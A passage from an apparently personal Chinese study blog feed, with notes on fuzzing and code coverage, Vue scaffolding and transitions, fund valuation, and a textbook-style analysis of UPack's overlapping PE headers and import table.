punctuation">(</span>runner<span class="token punctuation">)</span>        new_coverage <span class="token operator">=</span> <span class="token builtin">frozenset</span><span class="token punctuation">(</span>runner<span class="token punctuation">.</span>coverage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> outcome <span class="token operator">==</span> Runner<span class="token punctuation">.</span>PASS <span class="token keyword">and</span> new_coverage <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>coverages_seen<span class="token punctuation">:</span>            <span class="token comment"># We have new coverage</span>            self<span class="token punctuation">.</span>population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>inp<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>coverages_seen<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_coverage<span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>The nice thing about this strategy is that, applied to larger programs, it will happily explore one path after the other – covering functionality after functionality. All that is needed is a means to capture the coverage.</p></blockquote><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li>Randomly generated inputs are frequently invalid – and thus exercise mostly input processing functionality.</li><li>Mutations from existing valid inputs have much higher chances to be valid, and thus to exercise functionality beyond input processing.</li></ul><h2 id="Code-Coverage"><a href="#Code-Coverage" class="headerlink" title="Code Coverage"></a>Code Coverage</h2><p>如何衡量这些测试的有效性?一种方法是检查发现的漏洞的数量(和严重性);但是如果bug非常少，我们就需要一个代理来确定通过测试发现bug的可能性。在这一章中，我们介绍了代码覆盖率的概念，衡量在测试运行期间程序的哪些部分实际上被执行了。对于试图覆盖尽可能多的代码的测试生成器来说，度量这样的覆盖率也是至关重要的。</p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>黑盒测试的优点是可以在指定的行为中发现出错误. 缺点是 以实现的行为通常比指定的行为覆盖更多的领域, 因此仅基于规范的测试通常不能覆盖所有的实现细节.</p><blockquote><p>这话没毛病,毕竟是黑盒测试, 也仅仅只能通过函数的行为来进行测试. 并不能窥探到所有的实现细节.</p></blockquote><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>白盒测试的优点是它可以找到以实现的功能里面的错误. 即使规范中没有提供详细的细节.  但是它可能会漏掉没有实现的行为.如果有些特定的功能没有实现, 白盒测试就不能找到它.</p><blockquote><p>这最后一句话确定不是废话吗? 没实现就没有代码, 没有代码 那白盒测试肯定是测试不到的啊! 是我理解有问题吗?</p></blockquote><h3 id="运行时跟踪"><a href="#运行时跟踪" class="headerlink" title="运行时跟踪"></a>运行时跟踪</h3><p>这里介绍了py中的一个函数<code>sys.settrace(f)</code>, 这个函数在程序运行的每一行都会调用.可以用它来获取执行程序的行数\当前属于哪个函数体\当前的局部变量和参数</p><blockquote><p>当然C语言里面也有, 只不过要在编译的时候加一些参数, 然后运行之后,会产生<code>.gcov</code>的文件,里面包含了类似py中<code>sys.settrace()</code>函数捕捉到的信息</p></blockquote><p>![sys.settrace()的运行效果]](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211120205202.png">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211120205202.png</a>)</p><h3 id="Lessons-Learned-1"><a href="#Lessons-Learned-1" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li>Coverage metrics are a simple and fully automated means to approximate how much functionality of a program is actually executed during a test run.</li><li>A number of coverage metrics exist, the most important ones being statement coverage and branch coverage.</li><li>In Python, it is very easy to access the program state during execution, including the currently executed code. </li></ul>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-6-脚手架</title>
      <link href="/2021/11/18/vue-xue-xi-6-jiao-shou-jia/"/>
      <url>/2021/11/18/vue-xue-xi-6-jiao-shou-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue脚手架"><a href="#Vue脚手架" class="headerlink" title="Vue脚手架"></a>Vue脚手架</h1><p>Vue脚手架是一个基于Vue.js进行快速开发的完整系统，是一个专门为Vue应用快速搭建繁杂项目结构的脚手架，它可以轻松地创建新的应用程序，且可用于自动生成Vue和Webpack的项目模板.</p><h2 id="快速构建项目"><a href="#快速构建项目" class="headerlink" title="快速构建项目"></a>快速构建项目</h2><h3 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h3><p>为了更好地适应复杂项目的开发,Vue.js支持以.vue为扩展名的文件来定义一个组件. 这个组件被称为单文件组件,文件中封装了组件相关代码.如 html\css\js等,最终通过Webpack编译成js文件并在浏览器中运行.</p><h3 id="单文件组件嵌套"><a href="#单文件组件嵌套" class="headerlink" title="单文件组件嵌套"></a>单文件组件嵌套</h3><p>index.html 是入口地址,可调用App.vue. 在App.vue文件中可以调用其他组件,所以App.vue被称为根组件.</p><h3 id="组件之间的信息传递"><a href="#组件之间的信息传递" class="headerlink" title="组件之间的信息传递"></a>组件之间的信息传递</h3><p>父-&gt;子: <code>v-bind</code></p><p>子-&gt;父: 子组件通过<code>$emit</code>来触发事件,父组件在子组件的自定义标签上使用v-on指令来监听子组件触发的自定义事件.</p><p>非父子: 使用一个空的Vue实例作为中央事件总线.利用这个来<code>emit</code><strong>触发事件</strong>/<code>on</code><strong>监听事件</strong></p><h2 id="前端路由"><a href="#前端路由" class="headerlink" title="前端路由"></a>前端路由</h2><p>Vue.js的路由和<code>&lt;a&gt;</code>标签实现的功能是一样的,它们都实现一个对应的跳转,只不过路由的性能更佳. a标签无论点击多少次,都会发生对应的网络请求,页面会不停地进行刷新,但是使用路由机制,单击之后,不会出现请求及页面刷新,而会直接转换到要跳转的地址,这就是使用路由的好处.</p><p>随着前后端分离开发模式的兴起,出现了前端路由的概念:前端通过Ajax获取数据后,通过一定的方式渲染到页面中,<strong>改变URL不会向服务器发送请求</strong>,同时,前端可以监听URL变化,可以解析URL并执行相应操作,而后端只负责提供API来返回数据.</p><p><em>在Vue中,通过路由跳转到不同的页面中,实际上就是加载不同的组件.</em></p><blockquote><p>这里之前的那个问题可以说得到了解决</p><p>在企业实训的阶段中, 我们采用前端Vue+后端Springboot来完成整个项目, 其中使用到了shiro作为安全框架来管理后端验证和权限访问等等. <strong>其中出现了一个问题, 就是没有办法通过shiro来对访问的url进行限制,只能限制请求数据的接口</strong></p><p>🐷🐷🐷🐷🐷🐷</p><p>可以说这跟Vue的前端路由有很大的关系, 虽然我们把项目部署到了服务器上,但是依然采用的是前端路由的方式, 相当于请求的url地址根本没有经过后端. 也就不能被shiro管理, 从而进行权限验证并拦截. 而请求数据的接口就不一样了, 它们是真正向后端发起请求的.shiro是可以接受到, 并且进行拦截的.</p><p>👍👍👍👍👍</p><p>所以出现了这种问题,而我们的解决方案也很正确. 在需要拦截的地方使用了前端路由管理的方式. 只是当时这个问题的原因没有探讨的很清楚,虽然观察到了出现问题的现象, 但是没有从原理上里面出现问题的原因. </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>财经-基金-3-评价指标</title>
      <link href="/2021/11/17/cai-jing-ji-jin-3-ping-jie-zhi-biao/"/>
      <url>/2021/11/17/cai-jing-ji-jin-3-ping-jie-zhi-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="评价基金的方法"><a href="#评价基金的方法" class="headerlink" title="评价基金的方法"></a>评价基金的方法</h1><p>![指数基金估值方法分析汇总]](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211117201731.png">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211117201731.png</a>)</p><h2 id="博格公式法"><a href="#博格公式法" class="headerlink" title="博格公式法"></a>博格公式法</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211117201432.png" alt="指导方法"></p>]]></content>
      
      
      <categories>
          
          <category> 财经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基金 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-5-UPackPE文件头分析</title>
      <link href="/2021/11/17/ni-xiang-gong-cheng-he-xin-yuan-li-5-upackpe-wen-jian-tou-fen-xi/"/>
      <url>/2021/11/17/ni-xiang-gong-cheng-he-xin-yuan-li-5-upackpe-wen-jian-tou-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="UPackPE文件头分析"><a href="#UPackPE文件头分析" class="headerlink" title="UPackPE文件头分析"></a>UPackPE文件头分析</h1><h2 id="分析UPack的PE头"><a href="#分析UPack的PE头" class="headerlink" title="分析UPack的PE头"></a>分析UPack的PE头</h2><h3 id="重叠文件头"><a href="#重叠文件头" class="headerlink" title="重叠文件头"></a>重叠文件头</h3><p>重叠文件头是其他压缩器经常使用的技法，借助该方法可以把MZ文件头(IMAGE_DOS_HEADER)与PE文件头(IMAGE_NT_HEADERS)巧妙的叠加在一起。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118092257.png" alt="重叠文件头的对比">  </p><p>MZ文件头(IMAGE_DOS_HEADER)中有以下两个重要成员。其余的成员对程序运行无意义</p><blockquote><p>offset(0) e_magic : Magic number = 4D5A(‘MZ’)<br>offset(3C) e_lfanew: File address of new exe header</p></blockquote><p>问题在于PE文件格式规范，IMAGE_NT_HEADERS的起始位置是”可变的”，由e_lfanew来决定。</p><p><strong>正常的情况下</strong>：<code>e_lfanew = MZ文件头大小(40) + DOS存根大小(可变：VC++下为A0) = E0</code></p><p>这并不违反规定，只是钻了规范本身的空子</p><h3 id="IMAGE-FILE-HEADER-SizeOfOptionalHeader"><a href="#IMAGE-FILE-HEADER-SizeOfOptionalHeader" class="headerlink" title="IMAGE_FILE_HEADER.SizeOfOptionalHeader"></a>IMAGE_FILE_HEADER.SizeOfOptionalHeader</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118093808.png" alt="正常与修改后的对比"></p><p>从PE头文件来看，<strong>IMAGE_OPTIONAL_HEADER</strong>的起始偏移加上<strong>SizeOfOptionalHeader</strong>的值后才是<strong>IMAGE_SECTION_HEADER</strong>。增大<strong>SizeOfOptionalHeader</strong>以后，就相当于在<strong>IMAGE_OPTIONAL_HEADER</strong>与<strong>IMAGE_SECTION_HEADER</strong>之间增加了额外的空间，Upack就在这个区域增加解压代码。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118095011.png" alt="简要原理"></p><h2 id="重叠节区"><a href="#重叠节区" class="headerlink" title="重叠节区"></a>重叠节区</h2><p>Upack重叠PE节区与文件头</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118200644.png" alt="重叠示意图"></p><p>❓❓❓❓看的不是很明白,这里面尤其第一\第二节区, 它们确实是被重叠到Header上面了,但是内容上是怎么重叠的呢?肯定要删去一些东西把~~~</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118200732.png" alt="解压后的第一个节区"></p><p>映射的话, 应该不算很难, 更改加载的虚拟地址就行了.</p><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p>利用了PE装载器发现第一个节区的PointerToRawData(10)不是FileAlignment(200)的整数倍时,它会强制将其识别为整数倍.(该情况下为0); 这样做的话, Upack文件就可以正常运行, 但是很多PE相关使用程序就会发生错误.</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>这个emm,也没看懂</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118202538.png" alt="导入表的地址"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118202409.png" alt="第三个节区地址"></p><p>按照上面的将RVA-&gt;RAW</p><blockquote><p>RAW = RVA (271EE) - VirtualOffset(27000) + RawOffset(0)  = 1EE<br>注意: 3rd Section的RawOffset值不是10,而会强制变换为0</p></blockquote><p>书上说该处就是Upack节区隐藏玄机的地方</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118203940.png" alt="文件偏移IEE--第一个结构体"></p><p>上面所选区域就是IMAGE_IMPORT_DESCRIPTOR结构体组成的数组, 偏移IEE~201为第一个结构体, 其后既不是第二个结构体, 也不是NULL结构体</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118203752.png" alt="3rd节区映射到内存"></p><hr><p>❓❓❓❓ 为什么偏移200是第三个节区的结束呢? 之前的节区表里面, 写的是<code>RawSize为 1F0</code></p><hr><p>从文件看导入表好像是坏了,但是在加载到内存里面之后,看起来又是好的. </p><h2 id="导入地址表"><a href="#导入地址表" class="headerlink" title="导入地址表"></a>导入地址表</h2><p>通过上面结构体的数据, 得到</p><table><thead><tr><th>偏移</th><th>成员</th><th>RVA</th></tr></thead><tbody><tr><td>1EE</td><td>OriginalFistThunk(INT)</td><td>0</td></tr><tr><td>1FA</td><td>Name</td><td>2</td></tr><tr><td>1FE</td><td>FirstThunk(IAT)</td><td>11E8</td></tr></tbody></table><p>Name 的RVA是2, 它属于Header区域,因为第一个节区是从RVA 1000开始的.</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118210327.png" alt="文件偏移2"></p><p>😱😱😱这样看的话,好像Upack把数据重复利用了?! 既可以是Kernel32.dll, 又可以代表其他含义?</p><p>FirstThunk(IAT) 转换为RAW是<code>IE8</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118210552.png" alt="IE8"></p><p>这部分区域就是IAT域, 同时也作为INT来使用. 也就是说该处是 <code>Name Pointer(RVA)</code>数组 RVA 28/BE, 其结束是NULL. RVA位置上存放着导入函数的 <code>Ordinal+名称字符串</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211118211013.png" alt="RVA 28"></p><p>Q: 这样的话,导入函数最终的地址放到哪里去了?? </p><p>A: 这只是压缩过的代码,最后还得解压缩,应该会回复成正常的样子的…</p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-5-过渡和动画</title>
      <link href="/2021/11/16/vue-xue-xi-5-guo-du-he-dong-hua/"/>
      <url>/2021/11/16/vue-xue-xi-5-guo-du-he-dong-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="过渡和动画"><a href="#过渡和动画" class="headerlink" title="过渡和动画"></a>过渡和动画</h1><p>Vue.js过渡可以使页面元素在出现和消失时实现多种过渡效果。Vue在插入、更新或者移除DOM时，提供了多种方式的应用过渡效果。开发者可以使用transition组件,结合CSS的动画Animation、过渡Transition或者js来操作DOM使元素动起来。</p><h2 id="CSS过渡"><a href="#CSS过渡" class="headerlink" title="CSS过渡"></a>CSS过渡</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116183654.png" alt="过渡实现过程"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">   <span class="token selector">.fade-enter, .fade-leave-to</span> <span class="token punctuation">&#123;</span>    <span class="token property">opacity</span><span class="token punctuation">:</span> 0  <span class="token punctuation">&#125;</span>  <span class="token selector">.fade-enter-active, .fade-leave-active</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> opacity .5s  <span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>show = !show<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    切换按钮   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transition</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>show<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>transition</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">   <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#demo'</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>     <span class="token literal-property property">show</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CSS动画"><a href="#CSS动画" class="headerlink" title="CSS动画"></a>CSS动画</h2><p>CSS动画的用法与CSS过渡的用法相同，其区别是，在CSS动画中，v-enter类名在节点插入DOM后不会立即删除，而是在animationend事件触发时删除。</p><blockquote><p>这个看的不是很懂，后面用到再说吧</p></blockquote><h2 id="JS过渡"><a href="#JS过渡" class="headerlink" title="JS过渡"></a>JS过渡</h2><p>Js过渡是使用javascript钩子函数实现的过渡效果，这些钩子函数可以结合CSS的transition/animations使用，也可以单独使用。</p><p>感觉用js这个从结构上面看的话，就清楚很多了</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transition</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade<span class="token punctuation">"</span></span> <span class="token attr-name">@before-enter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>beforeEnter<span class="token punctuation">"</span></span> <span class="token attr-name">@enter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>enter<span class="token punctuation">"</span></span> <span class="token attr-name">@after-enter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>afterEnter<span class="token punctuation">"</span></span> <span class="token attr-name">@before-leave</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>beforeLeave<span class="token punctuation">"</span></span> <span class="token attr-name">@leave</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leave<span class="token punctuation">"</span></span> <span class="token attr-name">@after-leave</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>afterLeave<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">v-show</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>show<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>transition</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116185453.png" alt="控制台输出"></p><h2 id="案例–新增列表项的动画效果"><a href="#案例–新增列表项的动画效果" class="headerlink" title="案例–新增列表项的动画效果"></a>案例–新增列表项的动画效果</h2><p>具体的细节和效果用到的时候再去官网看就行了，还有很多细节和用法，就不在这赘述了。。。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    <span class="token selector">li</span> <span class="token punctuation">&#123;</span>        <span class="token property">border</span><span class="token punctuation">:</span> 1px dashed #999<span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>        <span class="token property">line-height</span><span class="token punctuation">:</span> 35px<span class="token punctuation">;</span>        <span class="token property">padding-left</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> 12px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">li:hover</span> <span class="token punctuation">&#123;</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> cornflowerblue<span class="token punctuation">;</span>        <span class="token property">transition</span><span class="token punctuation">:</span> all 1s ease<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">.v-enter,    .v-leave-to</span> <span class="token punctuation">&#123;</span>        <span class="token property">opacity</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>80px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">.v-enter-active,    .v-leave-active</span> <span class="token punctuation">&#123;</span>        <span class="token property">transition</span><span class="token punctuation">:</span> all 0.5s ease<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 下面的 .v-move 和 .v-leave-active 配合使用，能够实现列表后续的元素，渐渐地飘上来的结果 */</span>    <span class="token selector">.v-move</span> <span class="token punctuation">&#123;</span>        <span class="token property">transition</span><span class="token punctuation">:</span> all 0.5s ease<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">.v-leave-active</span> <span class="token punctuation">&#123;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>                学号:                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>                姓名:                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>添加<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 